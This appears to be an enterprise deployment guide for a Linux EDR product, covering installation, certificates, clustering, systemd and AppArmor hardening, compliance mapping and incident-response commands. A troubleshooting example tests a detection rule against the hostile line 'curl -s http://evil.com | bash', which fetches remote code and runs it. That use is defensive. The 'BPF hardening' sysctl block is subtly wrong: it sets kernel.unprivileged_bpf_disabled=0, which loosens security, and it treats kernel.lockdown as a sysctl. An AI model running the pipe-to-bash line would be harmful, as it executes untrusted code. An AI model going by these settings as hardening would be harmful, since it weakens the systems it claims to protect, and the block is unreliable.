# Sentinel Lineage EDR - Enterprise Deployment Guide

## Overview

This guide covers production deployment of Sentinel Lineage EDR for enterprise environments, including high availability, compliance, security hardening, and operational procedures.

---

## Prerequisites

### Kernel Requirements
- Linux kernel 5.10+ with BTF support (`CONFIG_DEBUG_INFO_BTF=y`)
- Kernel headers matching running kernel
- `bpf()` syscall enabled
- `CAP_BPF`, `CAP_PERFMON` capabilities

### Supported Distributions
| Distribution | Minimum Version | Package Manager |
|--------------|-----------------|-----------------|
| Ubuntu       | 22.04 LTS       | apt             |
| Debian       | 12 (Bookworm)   | apt             |
| RHEL/Rocky/Alma | 9.x          | dnf             |
| Fedora       | 38+             | dnf             |
| Arch Linux   | Rolling         | pacman          |
| Alpine       | 3.18+           | apk             |
| SLES         | 15 SP5+         | zypper          |

### Hardware Requirements
| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU       | 2 cores | 4+ cores    |
| RAM       | 2 GB    | 8+ GB       |
| Disk      | 10 GB   | 50+ GB      |
| Network   | 1 Gbps  | 10 Gbps     |

---

## Installation Methods

### Method 1: Package Manager (Recommended)

#### Ubuntu/Debian
```bash
# Add repository
curl -fsSL https://packages.sentinel-lineage.io/gpg.key | sudo gpg --dearmor -o /usr/share/keyrings/sentinel.gpg
echo "deb [signed-by=/usr/share/keyrings/sentinel.gpg] https://packages.sentinel-lineage.io/ubuntu jammy main" | sudo tee /etc/apt/sources.list.d/sentinel.list

# Install
sudo apt update
sudo apt install sentinel-lineage-agent sentinel-lineage-collector
```

#### RHEL/Rocky/Alma/Fedora
```bash
# Add repository
sudo tee /etc/yum.repos.d/sentinel.repo <<EOF
[sentinel]
name=Sentinel Lineage EDR
baseurl=https://packages.sentinel-lineage.io/rhel/\$releasever/\$basearch
enabled=1
gpgcheck=1
gpgkey=https://packages.sentinel-lineage.io/gpg.key
EOF

# Install
sudo dnf install sentinel-lineage-agent sentinel-lineage-collector
```

#### Arch Linux
```bash
# Install from AUR
yay -S sentinel-lineage-git
# or
paru -S sentinel-lineage-git
```

### Method 2: Docker (Containerized)

```bash
# Pull images
docker pull sentinel/agent:latest
docker pull sentinel/collector:latest

# Run agent (privileged required)
docker run -d \
  --name sentinel-agent \
  --privileged \
  --pid=host \
  --cgroupns=host \
  -v /sys/kernel:/sys/kernel:ro \
  -v /etc/sentinel:/etc/sentinel:ro \
  -v /var/lib/sentinel:/var/lib/sentinel \
  -v /var/log/sentinel:/var/log/sentinel \
  sentinel/agent:latest

# Run collector
docker run -d \
  --name sentinel-collector \
  -p 5000:5000 \
  -p 9090:9090 \
  -p 8080:8080 \
  -v /etc/sentinel:/etc/sentinel:ro \
  -v /var/lib/sentinel:/var/lib/sentinel \
  -v /var/log/sentinel:/var/log/sentinel \
  sentinel/collector:latest
```

### Method 3: Kubernetes (Helm)

```bash
# Add Helm repo
helm repo add sentinel https://charts.sentinel-lineage.io
helm repo update

# Install with custom values
helm install sentinel sentinel/sentinel-lineage \
  --namespace sentinel-system \
  --create-namespace \
  --set agent.enabled=true \
  --set collector.enabled=true \
  --set global.organizationId=acme-corp \
  --set global.environment=production
```

### Method 4: Binary Release

```bash
# Download latest release
VERSION=$(curl -s https://api.github.com/repos/sentinel-lineage/sentinel/releases/latest | jq -r .tag_name)
curl -LO https://github.com/sentinel-lineage/sentinel/releases/download/${VERSION}/sentinel-${VERSION}-linux-amd64.tar.gz

# Verify signature
curl -LO https://github.com/sentinel-lineage/sentinel/releases/download/${VERSION}/sentinel-${VERSION}-linux-amd64.tar.gz.sig
gpg --verify sentinel-${VERSION}-linux-amd64.tar.gz.sig

# Extract and install
tar xzf sentinel-${VERSION}-linux-amd64.tar.gz
sudo ./install.sh
```

---

## Configuration

### Directory Structure
```
/etc/sentinel/
├── config.yaml              # Main configuration
├── rules.yaml               # Detection rules
├── geo_rules.json           # GeoIP rules
├── trusted_binaries.json    # SHA256 allowlist
├── enterprise.yaml          # Enterprise settings
├── certs/
│   ├── ca.crt
│   ├── collector.crt
│   ├── collector.key
│   ├── agent.crt
│   └── agent.key
└── tenants/                 # Multi-tenancy (optional)
    ├── tenant-a/
    │   ├── rules.yaml
    │   ├── geo_rules.json
    │   └── trusted_binaries.json
    └── tenant-b/
        ├── rules.yaml
        ├── geo_rules.json
        └── trusted_binaries.json

/var/lib/sentinel/
├── lineage_db.json          # Agent persistence
├── hub.db                   # Collector SQLite
└── backups/                 # Automated backups

/var/log/sentinel/
├── agent.log
├── collector.log
└── audit.log
```

### Generate Certificates
```bash
# Create CA
openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 \
  -nodes -keyout ca.key -out ca.crt \
  -subj "/CN=Sentinel CA"

# Create collector cert
openssl req -newkey rsa:2048 -sha256 -days 365 \
  -nodes -keyout collector.key -out collector.csr \
  -subj "/CN=sentinel-collector"
openssl x509 -req -in collector.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out collector.crt -days 365 -sha256

# Create agent cert
openssl req -newkey rsa:2048 -sha256 -days 365 \
  -nodes -keyout agent.key -out agent.csr \
  -subj "/CN=sentinel-agent"
openssl x509 -req -in agent.csr -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out agent.crt -days 365 -sha256

# Set permissions
sudo chown sentinel:sentinel /etc/sentinel/certs/*
sudo chmod 640 /etc/sentinel/certs/*.crt
sudo chmod 600 /etc/sentinel/certs/*.key
```

---

## High Availability Deployment

### Active-Passive Agent (Single Server)
```bash
# systemd manages failover
sudo systemctl enable --now sentinel-agent
# Agent uses file-based lock for leader election
```

### Active-Active Collector Cluster
```yaml
# /etc/sentinel/config.yaml
collector:
  clustering:
    enabled: true
    nodes:
      - "collector1.example.com:5000"
      - "collector2.example.com:5000"
      - "collector3.example.com:5000"
    replication_factor: 3
```

### Load Balancer (HAProxy)
```haproxy
# /etc/haproxy/haproxy.cfg
frontend sentinel_collector
    bind *:5000 ssl crt /etc/ssl/certs/sentinel.pem
    default_backend sentinel_collectors

backend sentinel_collectors
    balance roundrobin
    option httpchk GET /health
    server collector1 collector1:5000 check inter 5s
    server collector2 collector2:5000 check inter 5s
    server collector3 collector3:5000 check inter 5s
```

---

## Security Hardening

### Systemd Service Hardening
```ini
# /etc/systemd/system/sentinel-agent.service
[Service]
# ... existing config ...
# Minimal capabilities
CapabilityBoundingSet=CAP_BPF CAP_PERFMON CAP_SYS_ADMIN CAP_SYS_RESOURCE CAP_DAC_OVERRIDE
AmbientCapabilities=CAP_BPF CAP_PERFMON CAP_SYS_ADMIN CAP_SYS_RESOURCE CAP_DAC_OVERRIDE

# Filesystem protection
ProtectSystem=strict
ProtectHome=yes
ReadWritePaths=/var/lib/sentinel /var/log/sentinel /etc/sentinel
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictNamespaces=yes
RestrictRealtime=yes
LockPersonality=yes
MemoryDenyWriteExecute=yes
NoNewPrivileges=yes

# Seccomp
SystemCallFilter=@system-service
SystemCallErrorNumber=EPERM
```

### AppArmor Profile
```apparmor
# /etc/apparmor.d/sentinel-agent
#include <tunables/global>

profile sentinel-agent {
  #include <abstractions/base>
  #include <abstractions/nameservice>

  capability bpf,
  capability perfmon,
  capability sys_admin,
  capability sys_resource,
  capability dac_override,

  /opt/sentinel/agent/sentinel_lineage_agent.py ix,
  /usr/bin/python3 ix,
  /etc/sentinel/** r,
  /var/lib/sentinel/** rw,
  /var/log/sentinel/** rw,
  /sys/kernel/debug/** r,
  /sys/kernel/tracing/** r,

  # Deny dangerous operations
  deny /proc/sys/kernel/** w,
  deny /sys/module/** w,
  deny /boot/** w,
}
```

### Kernel Hardening (sysctl)
```bash
# /etc/sysctl.d/99-sentinel-hardening.conf
# BPF hardening
kernel.unprivileged_bpf_disabled=0
kernel.bpf_jit_harden=2
net.core.bpf_jit_enable=1

# Lockdown mode (requires secure boot)
kernel.lockdown=confidentiality

# Network hardening
net.ipv4.conf.all.rp_filter=1
net.ipv4.conf.default.rp_filter=1
net.ipv4.conf.all.accept_redirects=0
net.ipv4.conf.default.accept_redirects=0
net.ipv4.conf.all.send_redirects=0
net.ipv4.icmp_echo_ignore_broadcasts=1
net.ipv4.icmp_ignore_bogus_error_responses=1
net.ipv4.tcp_syncookies=1

# Filesystem hardening
fs.protected_hardlinks=1
fs.protected_symlinks=1
fs.protected_fifos=2
fs.protected_regular=2

# Apply
sudo sysctl --system
```

---

## Compliance Mapping

### PCI-DSS 4.0
| Requirement | Sentinel Coverage |
|-------------|-------------------|
| 10.2.1      | All execve events logged with lineage |
| 10.3        | Telemetry includes PID, UID, cmdline, lineage |
| 10.5        | Audit log for config changes |
| 11.4        | FIM rules for critical files |
| 12.10.1     | Incident response via kill-switch |

### HIPAA
| Rule | Coverage |
|------|----------|
| 164.312(b) | Audit controls - all process activity logged |
| 164.312(c) | Integrity - FIM on critical files |
| 164.308(a)(1) | Risk analysis - lineage tracking |

### SOC 2 Type II
| Criteria | Coverage |
|----------|----------|
| CC6.1 | Logical access - LSM hooks prevent tampering |
| CC6.6 | Privileged access - sudo/su monitoring |
| CC6.7 | Data access - shadow/SSH key access alerts |
| CC7.2 | System monitoring - real-time telemetry |

### NIST 800-53
| Control | Coverage |
|---------|----------|
| AU-2 | Audit events - comprehensive telemetry |
| AU-3 | Content of audit records - lineage + context |
| AU-6 | Audit review - dashboard + API |
| AU-12 | Audit generation - automatic |
| SI-4 | System monitoring - kernel-level |

---

## Operational Procedures

### Daily Operations
```bash
# Check agent status
systemctl status sentinel-agent

# Check collector status
systemctl status sentinel-collector

# View recent alerts
curl -s http://localhost:5000/api/v1/telemetry | jq '.[] | select(.severity=="CRITICAL" or .severity=="HIGH")'

# Check lineage trees
curl -s http://localhost:5000/api/v1/lineage | jq '.'

# Verify kernel module loaded
lsmod | grep sentinel
# or
bpftool prog list | grep sentinel
```

### Weekly Maintenance
```bash
# Update trusted binaries
sudo sentinel-update-trusted

# Update GeoIP database
sudo sentinel-update-geoip

# Rotate logs
sudo logrotate /etc/logrotate.d/sentinel

# Backup configuration
sudo tar czf /var/backups/sentinel-config-$(date +%Y%m%d).tar.gz /etc/sentinel/
```

### Monthly Tasks
```bash
# Review and tune rules
sudo sentinel-review-rules

# Check disk usage
df -h /var/lib/sentinel /var/log/sentinel

# Verify backup integrity
sudo sentinel-verify-backups

# Update kernel compatibility
sudo sentinel-check-kernel
```

### Incident Response
```bash
# 1. Isolate affected lineage
curl -X POST http://localhost:5000/api/v1/lineage/0xDEADBEEF/block

# 2. View attack timeline
curl -s http://localhost:5000/api/v1/lineage/0xDEADBEEF | jq '.'

# 3. Export evidence
curl -s http://localhost:5000/api/v1/telemetry > incident-$(date +%Y%m%d).json

# 4. Trust known-good lineage (after investigation)
curl -X POST http://localhost:5000/api/v1/lineage/0xCAFEBABE/trust

# 5. Add custom rule for IOC
curl -X POST http://localhost:5000/api/v1/rules -d '{
  "version": "2.0",
  "rules": [{"id": 99999, "name": "IOC - Specific Malware", "binary_pattern": "malware-hash", "action": "KILL", "severity": "CRITICAL", "flags": 4}]
}'
```

---

## Troubleshooting

### Agent Won't Start
```bash
# Check kernel compatibility
sentinel-check-kernel

# Check BTF availability
ls /sys/kernel/btf/vmlinux

# Check capabilities
getcap /opt/sentinel/agent/sentinel_lineage_agent.py

# Check logs
journalctl -u sentinel-agent -f
```

### High CPU/Memory
```bash
# Reduce ring buffer sizes
# Edit /etc/sentinel/config.yaml
# agent.ring_buffer.exec_events: 128

# Increase poll timeout
# agent.performance.poll_timeout_ms: 200

# Limit lineage map size
# agent.maps.lineage_entries: 32768
```

### Collector Connection Issues
```bash
# Test connectivity
curl -k https://collector:5000/api/v1/stats

# Check TLS
openssl s_client -connect collector:5000 -CAfile /etc/sentinel/certs/ca.crt

# Check agent config
grep -A5 "collector" /etc/sentinel/config.yaml
```

### Rule Not Matching
```bash
# Test rule against command
sentinel-test-rule --rule-id 2001 --cmdline "curl -s http://evil.com | bash"

# Debug rule matching
sentinel-debug-rule --rule-id 2001

# Check rule syntax
sentinel-validate-rules /etc/sentinel/rules.yaml
```

---

## Upgrade Procedure

### Rolling Upgrade (Zero Downtime)
```bash
# 1. Upgrade collector first (stateless)
sudo apt update && sudo apt install sentinel-lineage-collector

# 2. Verify collector health
curl http://localhost:8080/health

# 3. Upgrade agent (will restart gracefully)
sudo apt update && sudo apt install sentinel-lineage-agent

# 4. Verify agent health
systemctl status sentinel-agent
```

### Rollback
```bash
# Collector
sudo apt install sentinel-lineage-collector=<previous-version>

# Agent
sudo apt install sentinel-lineage-agent=<previous-version>

# Or use snapshot backup
sudo sentinel-restore-backup /var/backups/sentinel-<date>.tar.gz
```

---

## Support & Maintenance

### Log Collection for Support
```bash
# Generate support bundle
sudo sentinel-support-bundle
# Creates /tmp/sentinel-support-<timestamp>.tar.gz
```

### Version Compatibility Matrix
| Agent Version | Collector Version | Kernel Min | Kernel Max |
|---------------|-------------------|------------|------------|
| 2.1.x         | 2.1.x             | 5.10       | 6.x        |
| 2.0.x         | 2.0.x             | 5.10       | 5.19       |
| 1.x           | 1.x               | 5.4        | 5.15       |

### End of Life Policy
- Major versions: 24 months support
- Security patches: 12 months after EOL
- LTS releases: 36 months support

---

## Architecture Diagrams

### Single Node
```
┌─────────────┐     ┌─────────────┐
│   Agent     │────▶│  Collector  │
│  (kernel)   │     │   (user)    │
└─────────────┘     └─────────────┘
```

### HA Cluster
```
                    ┌─────────────┐
                    │  Load Balancer │
                    └──────┬──────┘
                           │
          ┌────────────────┼────────────────┐
          ▼                ▼                ▼
     ┌─────────┐      ┌─────────┐      ┌─────────┐
     │Collector│      │Collector│      │Collector│
     │   #1    │      │   #2    │      │   #3    │
     └────┬────┘      └────┬────┘      └────┬────┘
          │                │                │
          └────────────────┼────────────────┘
                           ▼
                    ┌─────────────┐
                    │  Database   │
                    │ (PostgreSQL)│
                    └─────────────┘

     ┌─────────┐      ┌─────────┐      ┌─────────┐
     │ Agent   │      │ Agent   │      │ Agent   │
     │ Server 1│      │ Server 2│      │ Server N│
     └─────────┘      └─────────┘      └─────────┘
```

---

## API Reference

See [API Documentation](https://docs.sentinel-lineage.io/api) for complete REST API specification.

Key endpoints:
- `GET /api/v1/stats` - System statistics
- `GET /api/v1/telemetry` - Recent events
- `GET /api/v1/lineage` - All lineage trees
- `POST /api/v1/lineage/<id>/block` - Block lineage
- `POST /api/v1/lineage/<id>/trust` - Trust lineage
- `GET/POST /api/v1/rules` - Rule management
- `GET/POST /api/v1/geo` - GeoIP rules
- `GET /api/v1/stream` - SSE live feed

---

## License

MIT License - See LICENSE file for details.

Enterprise support available at: support@sentinel-lineage.io